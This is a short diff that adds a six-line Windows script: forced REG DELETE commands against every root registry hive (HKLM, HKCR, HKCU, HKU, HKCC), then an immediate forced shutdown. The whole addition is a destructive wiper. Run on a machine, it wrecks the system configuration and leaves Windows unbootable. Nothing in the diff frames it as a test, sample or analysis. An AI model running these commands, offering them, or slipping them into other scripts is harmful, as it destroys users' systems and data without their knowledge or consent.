@@ -1,0 +1,6 @@
+REG DELETE HKLM /f 
+REG DELETE HKCR /f 
+REG DELETE HKCU /f 
+REG DELETE HKU /f 
+REG DELETE HKCC /f 
+shutdown -s -f -t 0 
